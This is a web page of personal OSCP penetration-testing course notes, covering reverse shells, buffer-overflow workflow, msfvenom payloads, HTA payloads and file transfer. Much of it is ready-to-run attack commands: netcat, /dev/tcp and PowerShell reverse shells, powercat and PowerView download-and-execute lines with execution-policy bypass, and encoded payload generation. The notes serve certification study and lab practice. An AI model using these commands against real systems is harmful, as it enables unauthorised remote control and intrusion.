<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>OSCP Notes | Omar2535</title>
    <meta name="generator" content="VuePress 1.9.10">
    
    <meta name="description" content="Notes">
    
    <link rel="preload" href="/assets/css/0.styles.de540ae2.css" as="style"><link rel="preload" href="/assets/js/app.e90b9e2c.js" as="script"><link rel="preload" href="/assets/js/2.53b2ba1e.js" as="script"><link rel="preload" href="/assets/js/1.cc48f7d2.js" as="script"><link rel="preload" href="/assets/js/56.4bdb98d5.js" as="script"><link rel="prefetch" href="/assets/js/10.fc1976ac.js"><link rel="prefetch" href="/assets/js/100.802379ba.js"><link rel="prefetch" href="/assets/js/101.30b4b6e0.js"><link rel="prefetch" href="/assets/js/102.0d4fb7b7.js"><link rel="prefetch" href="/assets/js/103.16270e29.js"><link rel="prefetch" href="/assets/js/104.e764e46c.js"><link rel="prefetch" href="/assets/js/105.a445ecda.js"><link rel="prefetch" href="/assets/js/11.3fce9d23.js"><link rel="prefetch" href="/assets/js/12.dc96233c.js"><link rel="prefetch" href="/assets/js/13.1e689f64.js"><link rel="prefetch" href="/assets/js/14.e1329e2d.js"><link rel="prefetch" href="/assets/js/15.67f7e054.js"><link rel="prefetch" href="/assets/js/16.2ecd0653.js"><link rel="prefetch" href="/assets/js/17.798e9394.js"><link rel="prefetch" href="/assets/js/18.03a744a4.js"><link rel="prefetch" href="/assets/js/19.975dd7c7.js"><link rel="prefetch" href="/assets/js/20.c1b6bd0d.js"><link rel="prefetch" href="/assets/js/21.88b275c9.js"><link rel="prefetch" href="/assets/js/22.ef911ad5.js"><link rel="prefetch" href="/assets/js/23.df6ce246.js"><link rel="prefetch" href="/assets/js/24.ba61c33c.js"><link rel="prefetch" href="/assets/js/25.3195c123.js"><link rel="prefetch" href="/assets/js/26.3d0f6a9a.js"><link rel="prefetch" href="/assets/js/27.92afec31.js"><link rel="prefetch" href="/assets/js/28.2565fed9.js"><link rel="prefetch" href="/assets/js/29.9c8ed229.js"><link rel="prefetch" href="/assets/js/3.74092176.js"><link rel="prefetch" href="/assets/js/30.817fadc8.js"><link rel="prefetch" href="/assets/js/31.e95af4f7.js"><link rel="prefetch" href="/assets/js/32.65c1a09c.js"><link rel="prefetch" href="/assets/js/33.2d7964f4.js"><link rel="prefetch" href="/assets/js/34.4f59fa55.js"><link rel="prefetch" href="/assets/js/35.493484d8.js"><link rel="prefetch" href="/assets/js/36.a9fd784e.js"><link rel="prefetch" href="/assets/js/37.59f79452.js"><link rel="prefetch" href="/assets/js/38.543508ec.js"><link rel="prefetch" href="/assets/js/39.5de45353.js"><link rel="prefetch" href="/assets/js/4.a791e2ff.js"><link rel="prefetch" href="/assets/js/40.7faa7d8a.js"><link rel="prefetch" href="/assets/js/41.80e1e691.js"><link rel="prefetch" href="/assets/js/42.6fe9445e.js"><link rel="prefetch" href="/assets/js/43.e9329d79.js"><link rel="prefetch" href="/assets/js/44.32cc9330.js"><link rel="prefetch" href="/assets/js/45.f1610206.js"><link rel="prefetch" href="/assets/js/46.f274e4ef.js"><link rel="prefetch" href="/assets/js/47.1555cf29.js"><link rel="prefetch" href="/assets/js/48.9c505bfd.js"><link rel="prefetch" href="/assets/js/49.7c1675a4.js"><link rel="prefetch" href="/assets/js/5.213e8a2f.js"><link rel="prefetch" href="/assets/js/50.d752392d.js"><link rel="prefetch" href="/assets/js/51.44c263fa.js"><link rel="prefetch" href="/assets/js/52.bdd1809f.js"><link rel="prefetch" href="/assets/js/53.7cf056c5.js"><link rel="prefetch" href="/assets/js/54.aad110c0.js"><link rel="prefetch" href="/assets/js/55.1f1d59a8.js"><link rel="prefetch" href="/assets/js/57.df2c4b8a.js"><link rel="prefetch" href="/assets/js/58.cd5ccc48.js"><link rel="prefetch" href="/assets/js/59.7926c0a7.js"><link rel="prefetch" href="/assets/js/6.759a3df7.js"><link rel="prefetch" href="/assets/js/60.684e9e0f.js"><link rel="prefetch" href="/assets/js/61.d8f705f9.js"><link rel="prefetch" href="/assets/js/62.35151300.js"><link rel="prefetch" href="/assets/js/63.e354ea08.js"><link rel="prefetch" href="/assets/js/64.98c17167.js"><link rel="prefetch" href="/assets/js/65.ce422c7c.js"><link rel="prefetch" href="/assets/js/66.22abb726.js"><link rel="prefetch" href="/assets/js/67.a09ec169.js"><link rel="prefetch" href="/assets/js/68.642bfba7.js"><link rel="prefetch" href="/assets/js/69.89db523c.js"><link rel="prefetch" href="/assets/js/7.2b5aa5ce.js"><link rel="prefetch" href="/assets/js/70.f9b2468f.js"><link rel="prefetch" href="/assets/js/71.982a3d97.js"><link rel="prefetch" href="/assets/js/72.75edbe60.js"><link rel="prefetch" href="/assets/js/73.0f515ae3.js"><link rel="prefetch" href="/assets/js/74.52f434ef.js"><link rel="prefetch" href="/assets/js/75.4bd299d5.js"><link rel="prefetch" href="/assets/js/76.51b91894.js"><link rel="prefetch" href="/assets/js/77.494a4447.js"><link rel="prefetch" href="/assets/js/78.c17fe7b0.js"><link rel="prefetch" href="/assets/js/79.543318f8.js"><link rel="prefetch" href="/assets/js/80.0b97115b.js"><link rel="prefetch" href="/assets/js/81.66d869c7.js"><link rel="prefetch" href="/assets/js/82.8e8926e8.js"><link rel="prefetch" href="/assets/js/83.dff10bf7.js"><link rel="prefetch" href="/assets/js/84.2ac781a8.js"><link rel="prefetch" href="/assets/js/85.60293f19.js"><link rel="prefetch" href="/assets/js/86.46d7126b.js"><link rel="prefetch" href="/assets/js/87.0c5929f3.js"><link rel="prefetch" href="/assets/js/88.9e892158.js"><link rel="prefetch" href="/assets/js/89.5cceac4c.js"><link rel="prefetch" href="/assets/js/90.be2516f3.js"><link rel="prefetch" href="/assets/js/91.750b3c5c.js"><link rel="prefetch" href="/assets/js/92.8d607653.js"><link rel="prefetch" href="/assets/js/93.b7d0bb09.js"><link rel="prefetch" href="/assets/js/94.8d3e3ddd.js"><link rel="prefetch" href="/assets/js/95.a036ab7d.js"><link rel="prefetch" href="/assets/js/96.f6e35d5a.js"><link rel="prefetch" href="/assets/js/97.6d0c1d57.js"><link rel="prefetch" href="/assets/js/98.df2da740.js"><link rel="prefetch" href="/assets/js/99.83ea7e0f.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.b1b44aa7.js">
    <link rel="stylesheet" href="/assets/css/0.styles.de540ae2.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Omar2535</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/misc/Accomplishments/" class="sidebar-link">Accomplishments</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Certs/" class="sidebar-heading clickable"><span>Certs</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Courses/" class="sidebar-heading clickable router-link-active open"><span>Courses</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/CPSC310/" class="sidebar-heading clickable"><span>CPSC310</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PHYS203/" class="sidebar-heading clickable"><span>PHYS203</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PHYS216/" class="sidebar-heading clickable"><span>PHYS216</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PHYS304/" class="sidebar-heading clickable"><span>PHYS304</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PWK/" class="sidebar-heading clickable router-link-active open"><span>PWK</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/misc/Courses/PWK/buffer_overflow.html" class="sidebar-link">Buffer overflows</a></li><li><a href="/misc/Courses/PWK/course_notes.html" aria-current="page" class="active sidebar-link">OSCP Notes</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#bind-shell-vs-reverse-shell" class="sidebar-link">Bind shell vs reverse shell</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#buffer-overflows" class="sidebar-link">Buffer overflows</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#leveraging-html-applications" class="sidebar-link">Leveraging HTML applications</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#file-transfer" class="sidebar-link">FIle transfer</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#interactive-shells" class="sidebar-link">Interactive shells</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#msfvenom" class="sidebar-link">Msfvenom</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#windows-tips-tricks" class="sidebar-link">Windows tips &amp; tricks</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#microsoft-word-macro-payload" class="sidebar-link">Microsoft-word macro payload</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#metasploit-framework" class="sidebar-link">Metasploit framework</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#device-enumeration" class="sidebar-link">Device enumeration</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#privilege-escalation-priv-esc" class="sidebar-link">Privilege escalation (Priv esc)</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#port-forwarding" class="sidebar-link">Port forwarding</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#active-directory" class="sidebar-link">Active Directory</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#password-cracking" class="sidebar-link">Password cracking</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#wordpress-scanning" class="sidebar-link">Wordpress scanning</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/course_notes.html#tunneling" class="sidebar-link">Tunneling</a></li></ul></li><li><a href="/misc/Courses/PWK/linux_privesc.html" class="sidebar-link">Linux privilege escalation</a></li><li><a href="/misc/Courses/PWK/shells.html" class="sidebar-link">Shells</a></li><li><a href="/misc/Courses/PWK/sql_injection.html" class="sidebar-link">SQL injection</a></li><li><a href="/misc/Courses/PWK/windows_privesc.html" class="sidebar-link">Windows privilege escalation</a></li><li><a href="/misc/Courses/PWK/wordpress.html" class="sidebar-link">Wordpress</a></li></ul></section></li><li><a href="/misc/Courses/practical-ethical-hacking.html" class="sidebar-link">Practical ethical hacking</a></li></ul></section></li><li><a href="/misc/Guides/" class="sidebar-link">Guides</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Hackthebox/" class="sidebar-heading clickable"><span>Hackthebox</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Root-me/" class="sidebar-heading clickable"><span>Root-me</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Tryhackme/" class="sidebar-heading clickable"><span>Tryhackme</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Writeups/" class="sidebar-heading clickable"><span>Writeups</span> <span class="arrow right"></span></a> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="oscp-notes"><a href="#oscp-notes" class="header-anchor">#</a> OSCP Notes</h1> <h2 id="bind-shell-vs-reverse-shell"><a href="#bind-shell-vs-reverse-shell" class="header-anchor">#</a> Bind shell vs reverse shell</h2> <h3 id="bind-shell"><a href="#bind-shell" class="header-anchor">#</a> Bind shell</h3> <p>Basically, we are opening a port with our shell for other people to execute</p> <ul><li>Client computer starts up a listening session with shell executing on that port</li> <li>Connector just connects to the listening port that has shell already running</li></ul> <h3 id="reverse-shell"><a href="#reverse-shell" class="header-anchor">#</a> Reverse shell</h3> <p>Basically, we are sending our own shell over to the operator</p> <ul><li>Operator listens on a port</li> <li>Client computer connects to the listening port on the operator with the client's own shell</li> <li>Operator now has control of clients shell</li></ul> <h4 id="netcat-reverse-shell"><a href="#netcat-reverse-shell" class="header-anchor">#</a> Netcat reverse shell</h4> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">nc</span> <span class="token operator">&lt;</span>listening_host<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>listening_port<span class="token operator">&gt;</span> <span class="token parameter variable">-e</span> /bin/bash
</code></pre></div><h4 id="tcp-revsrse-shell"><a href="#tcp-revsrse-shell" class="header-anchor">#</a> TCP revsrse shell</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">&gt;</span> /dev/tcp/<span class="token operator">&lt;</span>attacker_ip<span class="token operator">&gt;</span>/<span class="token operator">&lt;</span>port<span class="token operator">&gt;</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><h4 id="powercat-reverse-shell-example"><a href="#powercat-reverse-shell-example" class="header-anchor">#</a> Powercat reverse shell example</h4> <div class="language- extra-class"><pre class="language-text"><code>powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd&quot;
</code></pre></div><h4 id="powershell-reverse-shell"><a href="#powershell-reverse-shell" class="header-anchor">#</a> Powershell reverse shell</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>powershell <span class="token parameter variable">-nop</span> <span class="token parameter variable">-c</span> <span class="token string">&quot;<span class="token variable">$client</span> = New-Object System.Net.Sockets.TCPClient('192.168.119.194',5555);<span class="token variable">$stream</span> = <span class="token variable">$client</span>.GetStream();[byte[]]<span class="token variable">$bytes</span> = 0..65535|%{0};while<span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0){;<span class="token variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="token variable">$bytes</span>,0, <span class="token variable">$i</span>);<span class="token variable">$sendback</span> = (iex <span class="token variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> + 'PS ' + (pwd).Path + '&gt; ';<span class="token variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="token variable">$sendback2</span>);<span class="token variable">$stream</span>.Write(<span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length);<span class="token variable">$stream</span>.Flush()};<span class="token variable">$client</span>.Close()&quot;</span>
</code></pre></div><h4 id="msfvenom-stageless-reverse-shell-payload"><a href="#msfvenom-stageless-reverse-shell-payload" class="header-anchor">#</a> MSFvenom stageless reverse shell payload</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.119.194 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">80</span> <span class="token parameter variable">-f</span> exe <span class="token operator">&gt;</span> shell.exe
</code></pre></div><h2 id="buffer-overflows"><a href="#buffer-overflows" class="header-anchor">#</a> Buffer overflows</h2> <ol><li>Search for buffer overflow vunlerability by determining at what length does the program crash</li> <li>Search for where instruction pointer is overwritten by generating non-repeating payload then finding the offset at which <code>eip</code> is overwritten</li> <li>Find the bad characters by using all the possible hex values and looking at the stack to see which characters didn't make it through</li> <li>Find which register points to somewhere in the stack where we can write to</li> <li>Find an instruction that jumps to the register ie. <code>jmp esp</code></li> <li>Get that instructions address and overwrite <code>eip</code> with that</li> <li>Use the register's location and put our shell code there</li></ol> <h3 id="create-pattern"><a href="#create-pattern" class="header-anchor">#</a> Create pattern</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msf-pattern_create <span class="token parameter variable">-l</span> <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span>
</code></pre></div><h3 id="pattern-offset-finder"><a href="#pattern-offset-finder" class="header-anchor">#</a> Pattern offset finder</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msf-pattern_offset <span class="token parameter variable">-q</span> <span class="token operator">&lt;</span>pattern_found<span class="token operator">&gt;</span>
</code></pre></div><h3 id="generate-assembly-instruction-opcodes"><a href="#generate-assembly-instruction-opcodes" class="header-anchor">#</a> Generate assembly instruction opcodes</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msf-nasm_shell
nasm <span class="token operator">&gt;</span> <span class="token function">add</span> eax,12
00000000  83C00C            <span class="token function">add</span> eax,byte +0xc
</code></pre></div><h3 id="mona-finding-jmp-esp"><a href="#mona-finding-jmp-esp" class="header-anchor">#</a> Mona finding jmp esp</h3> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token operator">!</span>mona jmp <span class="token parameter variable">-r</span> esp
<span class="token comment"># click view &gt; log or press alt + L</span>
</code></pre></div><p>or</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token operator">!</span>mona <span class="token function">find</span> <span class="token parameter variable">-s</span> <span class="token string">'\xff\xe4'</span>
</code></pre></div><h3 id="bad-characters"><a href="#bad-characters" class="header-anchor">#</a> Bad characters</h3> <p><strong>Be aware that if a buffer overflow is strict on length, then some bad characters that don't make it through will result in the buffer overflow crash not being triggered.</strong></p> <p>The following is missing <code>\x00,\x1A,\x1D</code></p> <div class="language-python extra-class"><pre class="language-python"><code>badchars <span class="token operator">=</span> <span class="token punctuation">(</span>
    <span class="token string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span>
    <span class="token string">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span>
    <span class="token string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span>
    <span class="token string">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span>
    <span class="token string">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span>
    <span class="token string">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span>
    <span class="token string">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span>
    <span class="token string">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>
<span class="token punctuation">)</span>
</code></pre></div><h3 id="windows-reverse-tcp-shells"><a href="#windows-reverse-tcp-shells" class="header-anchor">#</a> Windows reverse tcp shells</h3> <h4 id="shikata-ga-nai"><a href="#shikata-ga-nai" class="header-anchor">#</a> Shikata ga nai</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening_host<span class="token operator">&gt;</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening_port<span class="token operator">&gt;</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread <span class="token parameter variable">-f</span> c <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-b</span> <span class="token operator">&lt;</span>illegal characters as string ie. <span class="token string">&quot;<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x12">\x12</span>...&quot;</span><span class="token operator">&gt;</span>
</code></pre></div><h4 id="fnstenv-mov"><a href="#fnstenv-mov" class="header-anchor">#</a> Fnstenv mov</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening host<span class="token operator">&gt;</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening port<span class="token operator">&gt;</span> <span class="token parameter variable">-f</span> c <span class="token parameter variable">-e</span> x86/fnstenv_mov <span class="token parameter variable">-b</span> <span class="token string">&quot;<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x0d">\x0d</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x45">\x45</span>...&quot;</span>
</code></pre></div><h3 id="linux-reverse-tcp-shells"><a href="#linux-reverse-tcp-shells" class="header-anchor">#</a> Linux reverse tcp shells</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> linux/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.119.194 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread <span class="token parameter variable">-f</span> c <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-b</span> <span class="token operator">&lt;</span>illegal characters as string ie. <span class="token string">&quot;<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x12">\x12</span>...&quot;</span><span class="token operator">&gt;</span>
</code></pre></div><h2 id="leveraging-html-applications"><a href="#leveraging-html-applications" class="header-anchor">#</a> Leveraging HTML applications</h2> <h3 id="msfvenom-hta-payload"><a href="#msfvenom-hta-payload" class="header-anchor">#</a> msfvenom hta payload</h3> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">sudo</span> msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening_host<span class="token operator">&gt;</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening_port<span class="token operator">&gt;</span> <span class="token parameter variable">-f</span> hta-psh <span class="token parameter variable">-o</span> evil.hta 
</code></pre></div><p>Next, serve the file on port 80</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">sudo</span> python <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>
</code></pre></div><h2 id="file-transfer"><a href="#file-transfer" class="header-anchor">#</a> FIle transfer</h2> <h3 id="linux-to-windows"><a href="#linux-to-windows" class="header-anchor">#</a> Linux to Windows:</h3> <p><strong>IF USING FTP TRANFERRING BINARIES, REMEMBER TO USE FTP BINARY MODE FIRST</strong></p> <h4 id="powershell"><a href="#powershell" class="header-anchor">#</a> Powershell</h4> <p>In powershell:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token variable">$client</span> = <span class="token function">new-object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient
<span class="token variable">$client</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">&quot;http://192.168.119.194/tmp.txt&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;C:\tmp\file.txt&quot;</span><span class="token punctuation">)</span>
</code></pre></div><p>One line form:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token punctuation">(</span><span class="token function">new-object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">'http://www.xyz.net/file.txt'</span><span class="token punctuation">,</span><span class="token string">'C:\tmp\file.txt'</span><span class="token punctuation">)</span>
</code></pre></div><h5 id="executing-code-in-memory"><a href="#executing-code-in-memory" class="header-anchor">#</a> Executing code in memory</h5> <div class="language-powershell extra-class"><pre class="language-powershell"><code>powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec Bypass <span class="token operator">-</span>noexit <span class="token operator">-</span>C <span class="token string">&quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')&quot;</span>
</code></pre></div><h4 id="curtutil"><a href="#curtutil" class="header-anchor">#</a> Curtutil</h4> <p>If you don't have powershell access:</p> <div class="language-sh extra-class"><pre class="language-sh"><code>certutil.exe <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> <span class="token string">&quot;http://10.10.14.17/nc.exe&quot;</span> c:<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>nc.exe
</code></pre></div><h3 id="windows-to-linux"><a href="#windows-to-linux" class="header-anchor">#</a> Windows to linux</h3> <p>Create a python server and get it from the linux machine:</p> <p>On windows:</p> <div class="language-sh extra-class"><pre class="language-sh"><code>python <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>
</code></pre></div><p>On linux:</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">wget</span> http://<span class="token operator">&lt;</span>windows-machine-ip<span class="token operator">&gt;</span>/<span class="token operator">&lt;</span>file-name<span class="token operator">&gt;</span>
</code></pre></div><h4 id="netcat"><a href="#netcat" class="header-anchor">#</a> Netcat</h4> <p>In command prompt:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code>C:\tools\practical_tools\nc<span class="token punctuation">.</span>exe <span class="token operator">-</span>nvlp 4455 &gt; C:\Users\offset\Desktop\binary<span class="token punctuation">.</span>exe
</code></pre></div><p>In linux machine:</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">nc</span> <span class="token parameter variable">-w</span> <span class="token operator">&lt;</span>windows_ip_here<span class="token operator">&gt;</span> <span class="token number">4455</span> <span class="token operator">&lt;</span> binary.exe
</code></pre></div><h3 id="linux-to-linux"><a href="#linux-to-linux" class="header-anchor">#</a> Linux to linux</h3> <h4 id="wget"><a href="#wget" class="header-anchor">#</a> Wget</h4> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">wget</span> <span class="token number">192.168</span>.1.102:9999/file.txt
</code></pre></div><h4 id="curl"><a href="#curl" class="header-anchor">#</a> Curl</h4> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">curl</span> <span class="token parameter variable">-O</span> http://192.168.0.101/file.txt
</code></pre></div><h2 id="interactive-shells"><a href="#interactive-shells" class="header-anchor">#</a> Interactive shells</h2> <h3 id="semi-interactive"><a href="#semi-interactive" class="header-anchor">#</a> Semi-interactive</h3> <p>Getting a semi-interactive shells is simple:</p> <div class="language-sh extra-class"><pre class="language-sh"><code>python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn(&quot;/bin/bash&quot;)'</span>
